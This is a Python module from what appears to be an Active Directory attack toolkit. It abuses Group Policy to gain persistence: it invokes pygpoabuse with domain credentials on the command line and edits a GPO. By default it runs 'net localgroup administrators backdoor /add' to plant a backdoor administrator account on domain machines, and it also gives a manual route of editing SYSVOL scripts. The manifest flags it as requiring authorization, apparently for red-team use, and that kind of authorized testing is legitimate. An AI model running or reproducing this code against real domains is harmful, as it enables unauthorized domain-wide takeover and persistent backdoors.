"""GPO abuse — backdoor via Group Policy Object modification."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.persistence.gpo_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["gpo_modification", "persistence", "code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1484.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None)

    print("[*] GPO Abuse: Group Policy backdoor")
    print("[*] Domain: {}".format(cred.domain))

    import subprocess, shutil
    pygpoabuse = shutil.which("pygpoabuse") or shutil.which("pygpoabuse.py")
    if pygpoabuse:
        cmd = [pygpoabuse, "{}/{}:{}".format(cred.domain, cred.username or "", cred.password or ""),
               "-gpo-id", getattr(args, "target_dn", "") or ""]
        if dc_ip:
            cmd += ["-dc-ip", dc_ip]
        cmd += ["-command", getattr(args, "command", 'net localgroup administrators backdoor /add')]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] pyGPOAbuse not found")
    print("[*] Install: pip install pygpoabuse")
    print("[*] Manual: modify SYSVOL scripts in \\\\{}\\SYSVOL\\{}\\Policies\\".format(
        cred.domain, cred.domain))
    return 1
